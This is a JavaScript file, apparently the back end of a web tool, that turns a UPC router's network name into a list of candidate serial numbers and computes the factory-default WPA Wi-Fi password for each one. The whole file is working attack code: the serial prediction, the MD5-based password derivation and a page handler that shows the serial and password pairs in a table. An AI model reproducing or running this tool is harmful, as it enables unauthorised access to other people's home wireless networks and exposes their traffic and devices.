function upcPredictSerials(ssid)
{
    if(!ssid) return;
    
    var serials = [];
    for(var i = 0; i < 5; i++)
    {
        for (var p0 = 0; p0 < 10; p0++)
        {
            var baseNum = Math.floor(ssid / 100) + 25000 + i * 50000 - p0 * 25000;
            var a = Math.floor(baseNum / 68);
            if(a < 0 || a > 999) continue;

            while(true)
            {
                var p3 = baseNum - a * 68;
                if (p3 < 0 || p3 > 99) break;

                var p1 = Math.floor(a / 10);
                var p2 = a % 10;
                var p4 = ssid % 100;

                var serial = p0 * 10000000 + p1 * 100000 + p2 * 10000 + p3 * 100 + p4;
                serials.push(serial);
                if(a == 0) break;
                a--;
            }
        }
    }
    return serials;
}

function multi(a, b) {
    var result = [0, 0];

    a >>>= 0;
    b >>>= 0;

    if (a < 32767 && b < 65536) {
        result[0] = a * b;
        result[1] = (result[0] < 0) ? -1 : 0;
        return result;
    }

    var a00 = a & 0xFFFF, a16 = a >>> 16;
    var b00 = b & 0xFFFF, b16 = b >>> 16;

    var c00 = a00 * b00;
    var c16 = (c00 >>> 16) + (a16 * b00);
    var c32 = c16 >>> 16;
    c16 = (c16 & 0xFFFF) + (a00 * b16);
    c32 += c16 >>> 16;
    var c48 = c32 >>> 16;
    c32 = (c32 & 0xFFFF) + (a16 * b16);
    c48 += c32 >>> 16;

    result[0] = ((c16 & 0xFFFF) << 16) | (c00 & 0xFFFF);
    result[1] = ((c48 & 0xFFFF) << 16) | (c32 & 0xFFFF);
    return result;
}

function mangle(pp)
{
    var a = (((multi(pp[3], 0x68de3af))[1] >>> 8) - (pp[3] >>> 31)) % 4294967296;
    var b = ((pp[3] - a * 9999 + 1) * 11) % 4294967296;

    return (b * (pp[1] * 100 + pp[2] * 10 + pp[0])) % 4294967296;
}

function hash2pass(in_hash)
{
    var result = "";
    for (var i = 0; i < 8; i++)
    {
        var a = parseInt(in_hash.substr(i * 2, 2), 16) & 0x1f;
        a -= ((multi(a, 0xb21642c9)[1] >>> 4) * 23);

        a = (a & 0xff) + 0x41;

        if (a >= 73/*'I'*/) a++;
        if (a >= 76/*'L'*/) a++;
        if (a >= 79/*'O'*/) a++;

        result += String.fromCharCode(a);
    }
    return result;
}

function serialToPass(serial)
{
    var md5res1 = CryptoJS.MD5(CryptoJS.enc.Latin1.parse(serial)).toString();
    var nums = [];
    for(var i = 0; i < 8; i++){
        var str = md5res1.substr(i * 4, 4);
        nums.push(parseInt(str.substr(2,2)+str.substr(0,2), 16));
    }
        
    var w1 = mangle(nums.slice(0, 4));
    var w2 = mangle(nums.slice(4, 8));
    var md5inp = (padLeft(w1.toString(16), "00000000") + padLeft(w2.toString(16), "00000000")).toUpperCase();
    var md5res2 = CryptoJS.MD5(CryptoJS.enc.Latin1.parse(md5inp)).toString();
    return hash2pass(md5res2);
}

$(function(){
   var inpUpcSsid = $('#upcSsid'), inpUpcPrefixes = $('#upcPrefixes');
   new Array(inpUpcSsid, inpUpcPrefixes).forEach(function(x){ keyEventSignup(x, refreshUpc); });
   
   function refreshUpc(){
       var prefixes = inpUpcPrefixes.val().split(',').map(function(x){ return x.trim(); });
       var ssid = inpUpcSsid.val().replace('UPC', '').trim();

       var tableBody = "";
       if(ssid.length > 0 && ssid.length <= 7)
       {
           var serials = upcPredictSerials(parseInt(ssid));
           serials = serials.sort(function(a,b){ return a-b; });
           prefixes.forEach(function(prefix){
               if(prefix.length != 4) return;
               serials.forEach(function(serial){
                   var serialStr = prefix + padLeft(serial, "00000000");
                   var wpaPass = serialToPass(serialStr);
                   tableBody += "<tr><td>" + serialStr + "</td><td>" + wpaPass + "</td></tr>";
               });
           });
       }
       $("#upcTable tbody").html(tableBody);
   }
});